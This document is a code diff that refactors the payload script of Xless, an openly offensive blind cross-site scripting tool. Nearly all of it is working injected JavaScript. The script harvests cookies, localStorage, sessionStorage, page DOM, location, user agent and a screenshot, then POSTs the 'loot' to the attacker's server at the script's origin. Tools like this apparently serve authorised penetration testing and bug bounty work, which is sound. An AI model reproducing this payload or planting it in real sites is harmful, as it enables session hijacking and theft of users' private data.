@@ -1,72 +1,110 @@
 // Xless: The serverlesss Blind XSS app.
 // Author: Mazin Ahmed <mazin@mazinahmed.net>
+(function () {
+  var curScript = document.currentScript;
 
-console.log("Loaded xless.");
-var collected_data = {};
+  console.log("Loaded xless.");
 
-var curScript = document.currentScript;
-
-function return_value(value) {
-  return (value !== undefined) ? value : ""
-}
-
-function screenshot() {
-  return new Promise(function (resolve, reject) {
-    html2canvas(document.querySelector("html"), { letterRendering: 1, allowTaint: true, useCORS: true, width: 1024, height: 768}).then(function (canvas) {
-        resolve(return_value(canvas.toDataURL())) // png in dataURL format
-    });
-  });
-}
-
-
-function collect_data() {
-  return new Promise(function (resolve, reject) {
-    collected_data["Cookies"] = collected_data["Location"] = collected_data["Referrer"] = collected_data["User-Agent"] = collected_data["Browser Time"] = collected_data["Origin"] = collected_data["DOM"] = collected_data["localStorage"] = collected_data["sessionStorage"] = collected_data["Screenshot"] = "";
-
-    try { collected_data["Location"] = return_value(location.toString()) } catch(e) {}
-    try { collected_data["Cookies"] = return_value(document.cookie) } catch(e) {}
-    try { collected_data["Referrer"] = return_value(document.referrer) } catch(e) {}
-    try { collected_data["User-Agent"] = return_value(navigator.userAgent); } catch(e) {}
-    try { collected_data["Browser Time"] = return_value(new Date().toTimeString()); } catch(e) {}
-    try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}
-    try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}
-    collected_data["DOM"] = collected_data["DOM"].slice(0, 8192)
-    try { collected_data["localStorage"] = return_value(JSON.stringify(localStorage)); } catch(e) {}
-    try { collected_data["sessionStorage"] = return_value(JSON.stringify(sessionStorage)); } catch(e) {}
-    try {
-      screenshot().then(function(img) {
-        collected_data["Screenshot"] = img
-        resolve(collected_data)
+  function screenshot() {
+    return html2canvas(document.querySelector("html"), {
+      letterRendering: 1,
+      allowTaint: true,
+      useCORS: true,
+      width: 1024,
+      height: 768,
+    })
+      .then(function (canvas) {
+        return canvas.toDataURL(); // png in dataURL format
+      })
+      .catch(function () {
+        return "";
       });
-    } catch(e) {
-      resolve(collected_data)
-    }
-  });
-}
+  }
 
-
-function exfiltrate_loot() {
-  // Get the URI of our BXSS server
-  var uri = new URL(curScript.src);
-  var exf_url = uri.origin + "/c"
-
-  var xhr = new XMLHttpRequest()
-  xhr.open("POST", exf_url, true)
-  xhr.setRequestHeader("Content-Type", "application/json")
-  xhr.send(JSON.stringify(collected_data))
-}
-
-// Load the html2canvas dependency
-(function(d, script) {
-    script = d.createElement('script');
-    script.type = 'text/javascript';
-    script.async = true;
-    script.onload = function(){
-        // remote script has loaded
-        collect_data().then(function() {
-          exfiltrate_loot();
-        });
+  function collectData() {
+    var collectedData = {
+      Location: function () {
+        return location.toString();
+      },
+      Cookies: function () {
+        return document.cookie;
+      },
+      Referrer: function () {
+        return document.referrer;
+      },
+      "User-Agent": function () {
+        return navigator.userAgent;
+      },
+      "Browser Time": function () {
+        return new Date().toTimeString();
+      },
+      Origin: function () {
+        return location.origin;
+      },
+      DOM: function () {
+        return document.documentElement.outerHTML
+          .toString()
+          .replace(/\n/g, "")
+          .replace(/[\t ]+</g, "<")
+          .replace(/>[\t ]+</g, "><")
+          .replace(/>[\t ]+$/g, ">")
+          .replace("`", "")
+          .slice(0, 8192);
+      },
+      localStorage: function () {
+        return JSON.stringify(localStorage);
+      },
+      sessionStorage: function () {
+        return JSON.stringify(sessionStorage);
+      },
+      Screenshot: function () {
+        return screenshot();
+      },
     };
-    script.src = "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js";
-    d.getElementsByTagName('head')[0].appendChild(script);
-}(document));
+
+    return Promise.all(
+      Object.keys(collectedData).map(function (key) {
+        try {
+          return Promise.resolve(collectedData[key]()).then(function (value) {
+            collectedData[key] = value || "";
+          });
+        } catch (e) {
+          collectedData[key] = "";
+          return Promise.resolve();
+        }
+      })
+    ).then(function () {
+      return collectedData;
+    });
+  }
+
+  function exfiltrateLoot(collectedData) {
+    // Get the URI of our BXSS server
+    var uri = new URL(curScript.src);
+    var exfUrl = uri.origin + "/c";
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", exfUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(JSON.stringify(collectedData));
+  }
+
+  function loadScript(src) {
+    return new Promise(function (resolve) {
+      var script = document.createElement("script");
+      script.type = "text/javascript";
+      script.async = true;
+      script.onload = resolve;
+      script.onerror = resolve;
+      script.src = src;
+      document.getElementsByTagName("head")[0].appendChild(script);
+    });
+  }
+
+  // Load the html2canvas dependency
+  loadScript(
+    "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js"
+  )
+    .then(collectData)
+    .then(exfiltrateLoot);
+})();
